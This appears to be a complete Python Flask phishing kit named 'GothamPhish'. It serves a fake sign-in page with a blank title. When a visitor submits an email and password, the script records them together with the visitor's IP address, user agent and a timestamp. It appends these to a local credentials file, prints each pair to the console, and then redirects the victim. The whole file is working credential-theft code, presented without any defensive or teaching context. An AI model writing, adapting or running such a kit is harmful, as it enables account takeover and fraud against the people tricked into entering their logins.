#!/usr/bin/env python3
# GothamPhish — Powered by Maxime Leal
from flask import Flask, request, render_template_string, redirect
import datetime, json

app = Flask(__name__)
LOG = "gotham_creds.json"

PAGE = """
<!DOCTYPE html>
<html><head><title></title>
<style>body{background:#fff;font-family:Arial;display:flex;justify-content:center;padding-top:80px}
.box{width:360px}.box input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}
.box button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
h2{color:#1a73e8;text-align:center}</style></head>
<body><div class="box">
<h2></h2>
<form method="POST" action="/login">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/login", methods=["POST"])
def login():
    data = {
        "email":    request.form.get("email"),
        "password": request.form.get("password"),
        "ip":       request.remote_addr,
        "ua":       request.headers.get("User-Agent"),
        "ts":       str(datetime.datetime.now())
    }
    with open(LOG, "a") as f:
        f.write(json.dumps(data) + "\n")
    print(f"[GothamPhish] CRED: {data['email']}:{data['password']}")
    return redirect("https://")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
